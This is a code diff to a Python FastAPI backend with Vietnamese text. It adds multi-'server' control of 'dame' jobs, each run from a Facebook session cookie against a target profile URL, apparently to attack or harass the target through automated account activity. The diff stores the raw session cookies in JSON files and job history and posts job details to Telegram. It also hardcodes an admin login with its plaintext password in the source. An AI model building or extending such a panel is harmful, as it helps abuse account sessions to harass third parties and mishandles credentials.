@@ -24,6 +24,7 @@ login_jobs = {}  # job_id -> {"status": "pending/done/error", "result": {}}
 HISTORY_FILE  = "history.json"
 USERS_FILE    = "users.json"
 SESSIONS_FILE = "sessions.json"
+SERVERS_FILE  = "servers.json"
 
 ADMIN_ACCOUNTS = {
     "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
@@ -45,6 +46,8 @@ def load_users():     return _load(USERS_FILE, {})
 def save_users(u):    _save(USERS_FILE, u)
 def load_sessions():  return _load(SESSIONS_FILE, {})
 def save_sessions(s): _save(SESSIONS_FILE, s)
+def load_servers():   return _load(SERVERS_FILE, [])
+def save_servers(s):  _save(SERVERS_FILE, s)
 
 def add_history(record):
     records = load_history()
@@ -225,12 +228,90 @@ async def admin_delete(request: Request):
     return JSONResponse({"ok": True})
 
 # ════════════════════════════════
+# SERVERS (máy chủ ảo dame)
+# ════════════════════════════════
+@app.get("/api/servers")
+async def api_get_servers(request: Request):
+    username = get_session_user(get_token(request))
+    if not username: raise HTTPException(401, "Chưa đăng nhập")
+    servers = load_servers()
+    if not is_admin(username):
+        servers = [s for s in servers if s.get("owner") == username]
+    return JSONResponse(servers)
+
+@app.post("/api/servers")
+async def api_create_server(request: Request):
+    username = get_session_user(get_token(request))
+    if not username: raise HTTPException(401, "Chưa đăng nhập")
+    data = await request.json()
+    name       = (data.get("name") or "").strip()
+    cookie     = (data.get("cookie") or "").strip()
+    target_url = (data.get("target_url") or "").strip()
+    speed      = data.get("speed", "normal")
+    acc_name   = data.get("acc_name", "")
+    acc_uid    = data.get("acc_uid", "")
+    target_name = data.get("target_name", "")
+    if not cookie or not target_url:
+        raise HTTPException(400, "Thiếu cookie hoặc target")
+    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    server = {
+        "id": "dzixmode" + "".join([str(__import__("random").randint(0,9)) for _ in range(6)]),
+        "owner": username,
+        "name": name or f"Máy chủ {now}",
+        "cookie": cookie,
+        "target_url": target_url,
+        "target_name": target_name,
+        "acc_name": acc_name,
+        "acc_uid": acc_uid,
+        "speed": speed,
+        "status": "ready",   # ready | running | stopped
+        "created": now
+    }
+    servers = load_servers()
+    servers.insert(0, server)
+    save_servers(servers)
+    asyncio.create_task(tg(
+        f"🖥 <b>Tạo máy chủ mới</b>\n"
+        f"👤 User: <code>{username}</code>\n"
+        f"📛 Tên: {server['name']}\n"
+        f"🎯 Target: {target_name or target_url}\n"
+        f"🕐 {now}"
+    ))
+    return JSONResponse({"ok": True, "server": server})
+
+@app.delete("/api/servers/{server_id}")
+async def api_delete_server(server_id: str, request: Request):
+    username = get_session_user(get_token(request))
+    if not username: raise HTTPException(401, "Chưa đăng nhập")
+    servers = load_servers()
+    new_list = [s for s in servers if not (s["id"] == server_id and (s["owner"] == username or is_admin(username)))]
+    if len(new_list) == len(servers):
+        raise HTTPException(404, "Không tìm thấy hoặc không có quyền")
+    save_servers(new_list)
+    return JSONResponse({"ok": True})
+
+@app.patch("/api/servers/{server_id}/status")
+async def api_update_server_status(server_id: str, request: Request):
+    username = get_session_user(get_token(request))
+    if not username: raise HTTPException(401, "Chưa đăng nhập")
+    data = await request.json()
+    status = data.get("status", "ready")
+    servers = load_servers()
+    for s in servers:
+        if s["id"] == server_id and (s["owner"] == username or is_admin(username)):
+            s["status"] = status
+            break
+    save_servers(servers)
+    return JSONResponse({"ok": True})
+
+# ════════════════════════════════
 # DAME ENDPOINTS
 # ════════════════════════════════
 from dame_runner import (
     verify_fb_cookie, get_target_name,
     start_dame, pause_dame, resume_dame, stop_dame,
     get_status, get_screenshot, fb_login_by_pass,
+    get_all_status, DAME_SESSIONS,
     _captcha_sessions
 )
 import os
@@ -269,7 +350,7 @@ async def api_dame_start(request: Request):
     if not cookie or not target_url: raise HTTPException(400, "Thiếu cookie hoặc target")
     await start_dame(cookie, target_url, speed, acc_name, acc_uid, target_name)
     now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    add_history({"id": secrets.token_hex(4), "owner": username, "type": "dame",
+    add_history({"id": "dzixmode" + "".join([str(__import__("random").randint(0,9)) for _ in range(6)]), "owner": username, "type": "dame",
                  "acc_name": acc_name, "acc_uid": acc_uid, "target": target_url,
                  "target_name": target_name, "speed": speed, "time": now, "cookie": cookie})
     asyncio.create_task(tg(
@@ -284,7 +365,14 @@ async def api_dame_start(request: Request):
 async def api_dame_status(request: Request):
     username = get_session_user(get_token(request))
     if not username: raise HTTPException(401, "Chưa đăng nhập")
-    return JSONResponse(get_status())
+    server_id = request.query_params.get("server_id","")
+    return JSONResponse(get_status(server_id))
+
+@app.get("/api/dame/status/all")
+async def api_dame_status_all(request: Request):
+    username = get_session_user(get_token(request))
+    if not username: raise HTTPException(401, "Chưa đăng nhập")
+    return JSONResponse(get_all_status())
 
 @app.get("/api/dame/screenshot")
 async def api_dame_screenshot(request: Request):
@@ -296,19 +384,32 @@ async def api_dame_screenshot(request: Request):
 async def api_dame_pause(request: Request):
     username = get_session_user(get_token(request))
     if not username: raise HTTPException(401, "Chưa đăng nhập")
-    pause_dame(); return JSONResponse({"ok": True})
+    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
+    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
+    pause_dame(server_id); return JSONResponse({"ok": True})
 
 @app.post("/api/dame/resume")
 async def api_dame_resume(request: Request):
     username = get_session_user(get_token(request))
     if not username: raise HTTPException(401, "Chưa đăng nhập")
-    resume_dame(); return JSONResponse({"ok": True})
+    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
+    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
+    resume_dame(server_id); return JSONResponse({"ok": True})
 
 @app.post("/api/dame/stop")
 async def api_dame_stop(request: Request):
     username = get_session_user(get_token(request))
     if not username: raise HTTPException(401, "Chưa đăng nhập")
-    stop_dame(); return JSONResponse({"ok": True})
+    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
+    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
+    stop_dame(server_id)
+    if server_id:
+        servers = load_servers()
+        for s in servers:
+            if s["id"] == server_id:
+                s["status"] = "stopped"; break
+        save_servers(servers)
+    return JSONResponse({"ok": True})
 
 if __name__ == "__main__":
     import uvicorn
